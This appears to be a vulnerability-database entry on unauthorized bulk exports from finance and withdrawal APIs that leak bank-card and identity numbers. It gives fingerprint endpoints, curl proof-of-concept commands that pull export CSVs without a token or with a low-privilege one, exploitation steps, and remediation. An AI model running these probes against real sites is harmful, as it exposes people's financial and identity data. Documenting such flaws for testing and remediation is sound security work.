---
title: Unauthorized financial exports (bulk bank-card + identity-number export)
cve: None (business logic)
severity: critical
cvss: 9.0
product: Custom finance/withdrawal module (financial impact)
versions: Any
ports: 80, 443
keywords: finance, export, bank cards, identity numbers, withdrawals, broken access control
entry: /api/finance/export  /api/withdraw/export
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

```
GET /api/finance/export?startDate=..&endDate=..
GET /api/withdraw/export?status=approved
GET /api/admin/export/member
```

## Prerequisites

- A regular member or low-privilege agent token (sometimes no authentication at all).

## PoC

```bash
# 1) Try without authentication first
curl -s 'https://target/api/finance/export?startDate=2026-01-01&endDate=2026-01-31' -o /tmp/e.csv -w '%{http_code} %{size_download}\n'
head -2 /tmp/e.csv
# Result: 200 + CSV headers containing card/identity numbers = confirmed

# 2) Retry with a regular token (many sites only hide menus in the frontend)
curl -s 'https://target/api/withdraw/export?status=approved' -H "Authorization: Bearer <t>" -o /tmp/w.csv -w '%{http_code} %{size_download}\n'
head -2 /tmp/w.csv
```

## Exploitation Steps

1. Try without a token first (most common);
2. Then try a low-privilege token; only 403 for both counts as secure;
3. After success, **retain only the header and first 3 rows** to demonstrate the fields (card/identity/phone numbers); do not save the full dataset;
4. Evidence: HTTP headers + table header + count (total rows), with content masked.

## Remediation and Mitigation

- Require an administrator role + row-level scope for exports; asynchronous jobs + audit logs (who exported how many rows).
- Mask sensitive fields (retain only the last four card digits); watermark exports.

## References

- OWASP API5 BFLA; personal-information protection compliance requirements (minimize exports).
